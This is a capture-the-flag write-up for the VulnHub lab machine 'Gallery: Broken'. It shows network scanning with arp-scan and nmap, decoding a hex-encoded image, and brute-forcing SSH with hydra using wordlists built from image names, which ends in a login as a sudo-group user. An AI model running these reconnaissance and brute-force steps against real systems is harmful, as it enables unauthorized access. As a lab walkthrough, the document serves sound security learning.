# Gallery: Broken

## 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.251 00:0c:29:05:05:03       VMware, Inc.
192.168.127.254 00:50:56:f1:df:13       VMware, Inc.
```

The ip address is `192.168.127.251`, let's enumerate it


## 2.Enumeration

```bash
root@kali: nmap -p22,80 -sC -sV -v -oN nmap.out 192.168.127.251

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 39:5e:bf:8a:49:a3:13:fa:0d:34:b8:db:26:57:79:a7 (RSA)
|   256 20:d7:72:be:30:6a:27:14:e1:e6:c2:16:7a:40:c8:52 (ECDSA)
|_  256 84:a0:9a:59:61:2a:b7:1e:dd:6e:da:3b:91:f9:a0:c6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 55K   2019-08-09 01:20  README.md
| 1.1K  2019-08-09 01:21  gallery.html
| 259K  2019-08-09 01:11  img_5terre.jpg
| 114K  2019-08-09 01:11  img_forest.jpg
| 663K  2019-08-09 01:11  img_lights.jpg
| 8.4K  2019-08-09 01:11  img_mountains.jpg
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:05:05:03 (VMware)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 80 there is nothing but afew image and a readme file which has HEX info in it, so i turned it to ASCII :

```bash
root@kali: cat README.md | xxd -r -p | head

����JFIF��Compressed by jpeg-recompress���
...
```

as it showd it is compressed by jpeg recompress so just change the extension to jpeg:

```bash
root@kali: cat README.md | xxd -r -p > image.jpeg
```

now open it in browser or image viewer :


![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5fa1cb46-8150-4082-affb-a51799429005)


there is nothing useful in this picutre, so i tried to enumerate the web directory with different methods :

- Enumerating files
- Enumerating directories
- Bruteforcing with user bob, lead to nothing again
- Checking all images metadata

## 3.Gaining Shell

i just got frustrated with this CTF, but for the last try i just used image names as user and password and tried to brute force the ssh :

```text
root@kali: cat user.txt
broken
5terre
forest
lights
mountains
gallery

root@kali: cat pass.txt
broken
5terre
forest
lights
mountains
gallery
```

```bash
root@kali: hydra -L user.txt  -P pass.txt -v 192.168.127.251 ssh -t 5

INFO] Testing if password authentication is supported by ssh://broken@192.168.127.251:22
[INFO] Successful, password authentication is supported by ssh://192.168.127.251:22
[22][ssh] host: 192.168.127.251   login: broken   password: broken
```

now we can ssh to target :

```bash
root@kali: ssh broken@192.168.127.251

Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

762 packages can be updated.
458 updates are security updates.

Last login: Sat Jan 27 02:51:54 2024 from 192.168.127.128

broken@ubuntu:~$ id
uid=1000(broken) gid=1000(broken) groups=1000(broken),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```









